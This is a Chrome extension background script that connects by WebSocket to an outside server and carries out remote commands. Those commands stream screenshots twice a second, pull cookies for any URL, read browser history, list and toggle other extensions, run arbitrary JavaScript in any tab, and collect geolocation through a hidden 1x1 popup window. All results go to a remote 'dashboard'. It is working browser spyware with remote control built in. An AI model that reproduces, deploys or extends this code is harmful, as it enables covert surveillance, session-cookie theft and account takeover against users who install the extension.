// background.js (Chrome Extension background script)
(() => {
  const WS_URL = "wss://test.psannetwork.net";
  let ws;
  let screenshotIntervalId = null;
  let myExtensionId = null;    // Stored ID1 for this extension
  let dashboardTarget = null;  // Dashboard's ID (ID0) to which messages should be sent

  function connectWS() {
    ws = new WebSocket(WS_URL);
    ws.binaryType = "blob";

    ws.onopen = () => {
      console.log("WS connected to: " + WS_URL);
      // Retrieve both IDs from chrome storage
      chrome.storage.local.get(["ID1", "ID0"], (result) => {
        myExtensionId = result.ID1;
        dashboardTarget = result.ID0;
        if (myExtensionId && dashboardTarget) {
          ws.send(JSON.stringify({ command: "extensionInfo", data: { id: myExtensionId, target: dashboardTarget } }));
          console.log("Sent extensionInfo with ID:", myExtensionId, "target (dashboard ID):", dashboardTarget);
        } else {
          console.error("必要なID (ID1 または ID0) がストレージに存在しません。拡張機能の設定を見直してください。");
        }
      });
    };

    ws.onmessage = (event) => {
      let msg;
      if (event.data instanceof Blob) {
        event.data
          .text()
          .then((text) => {
            try {
              msg = JSON.parse(text);
              handleCommand(msg);
            } catch (error) {
              console.error("Failed to parse message:", error);
            }
          })
          .catch((error) => {
            console.error("Blob conversion error:", error);
          });
      } else {
        try {
          msg = JSON.parse(event.data);
          handleCommand(msg);
        } catch (error) {
          console.error("Failed to parse message:", error);
        }
      }
    };

    ws.onerror = (error) => {
      console.error("WS error:", error);
    };

    ws.onclose = () => {
      console.log("WS connection closed");
      if (navigator.onLine) {
        console.log("Attempting to reconnect...");
        setTimeout(connectWS, 5000);
      } else {
        console.log("Offline; waiting to reconnect...");
        const onlineChecker = setInterval(() => {
          if (navigator.onLine) {
            clearInterval(onlineChecker);
            connectWS();
          }
        }, 5000);
      }
    };
  }

  function handleCommand(message) {
    const command = message.command;
    switch (command) {
      case "echo":
        ws.send(JSON.stringify({ command: "echoResponse", data: "ok", target: dashboardTarget }));
        break;
      case "startScreenshot":
        startScreenshot();
        break;
      case "stopScreenshot":
        stopScreenshot();
        break;
      case "openURL":
        openURL(message.data);
        break;
      case "listWindows":
        listWindows();
        break;
      case "closeTab":
        closeTab(message.data.tabId);
        break;
      case "resizeWindow":
        resizeWindow(message.data);
        break;
      case "openGeo":
        openGeolocationWindow();
        break;
      case "getCookies":
        getCookies(message.data.url);
        break;
      case "getExtensions":
        getExtensions();
        break;
      case "enableExtension":
        setExtensionEnabled(message.data.id, true);
        break;
      case "disableExtension":
        setExtensionEnabled(message.data.id, false);
        break;
      case "getHistory":
        getHistory(message.data);
        break;
      case "executeJS":
        // 新たに追加した、指定タブで任意のJSを実行するコマンド
        executeScriptOnTab(message.data.tabId, message.data.script);
        break;
      default:
        console.log("Unknown command:", command);
    }
  }

  function startScreenshot() {
    if (screenshotIntervalId !== null) return;
    screenshotIntervalId = setInterval(() => {
      chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
        if (chrome.runtime.lastError) {
          console.error("captureVisibleTab error:", chrome.runtime.lastError);
        } else {
          ws.send(JSON.stringify({ command: "screenshot", data: dataUrl, target: dashboardTarget }));
        }
      });
    }, 500);
    console.log("Started screenshot capture");
  }

  function stopScreenshot() {
    if (screenshotIntervalId !== null) {
      clearInterval(screenshotIntervalId);
      screenshotIntervalId = null;
      console.log("Stopped screenshot capture");
    }
  }

  function openURL({ url, mode, width, height }) {
    if (!url) return;
    if (mode === "window") {
      chrome.windows.create({
        url: url,
        type: "popup",
        width: width || 800,
        height: height || 600,
      });
    } else {
      chrome.tabs.create({ url: url });
    }
  }

  function listWindows() {
    chrome.windows.getAll({ populate: true }, (windows) => {
      ws.send(JSON.stringify({ command: "listWindowsResponse", data: windows, target: dashboardTarget }));
    });
  }

  function closeTab(tabId) {
    if (tabId) {
      chrome.tabs.remove(tabId, () => {
        console.log("Closed tab:", tabId);
      });
    }
  }

  function resizeWindow({ windowId, width, height }) {
    if (windowId && width && height) {
      chrome.windows.update(windowId, { width, height }, () => {
        console.log("Resized window:", windowId);
      });
    }
  }

  function openGeolocationWindow() {
    const url = chrome.runtime.getURL("geolocation.html");
    chrome.windows.create({
      url: url,
      type: "popup",
      width: 1,
      height: 1,
    });
  }

  function getCookies(url) {
    if (!url) return;
    chrome.cookies.getAll({ url: url }, (cookies) => {
      const cookieData = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
      ws.send(JSON.stringify({ command: "cookiesResponse", data: cookieData, target: dashboardTarget }));
    });
  }

  function getExtensions() {
    chrome.management.getAll((extensions) => {
      ws.send(JSON.stringify({ command: "extensionsResponse", data: extensions, target: dashboardTarget }));
    });
  }

  function setExtensionEnabled(id, enabled) {
    if (id) {
      chrome.management.setEnabled(id, enabled, () => {
        console.log("Set extension", id, enabled ? "enabled" : "disabled");
        getExtensions();
      });
    }
  }

  function getHistory({ maxResults }) {
    chrome.history.search({ text: "", maxResults: maxResults || 20 }, (historyItems) => {
      ws.send(JSON.stringify({ command: "historyResponse", data: historyItems, target: dashboardTarget }));
    });
  }

  // executeJS コマンド用：指定タブで任意のJavaScriptコードを実行する
  function executeScriptOnTab(tabId, script) {
    if (!tabId || !script) {
      console.error("executeScriptOnTab requires tabId and script");
      return;
    }
    chrome.tabs.executeScript(tabId, { code: script }, (result) => {
      if (chrome.runtime.lastError) {
        console.error("Script execution error:", chrome.runtime.lastError.message);
      } else {
        console.log("Script executed on tab", tabId, "result:", result);
      }
    });
  }

  // Listen for messages from other parts of the extension (e.g., geolocation.js)
  chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === "geoInfo") {
      console.log("Received geoInfo message:", request.data);
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ command: "GeoInfoShow", data: request.data, target: dashboardTarget }));
      } else {
        console.error("WebSocket is not open. Cannot send geolocation data.");
      }
    }
  });

  connectWS();
})();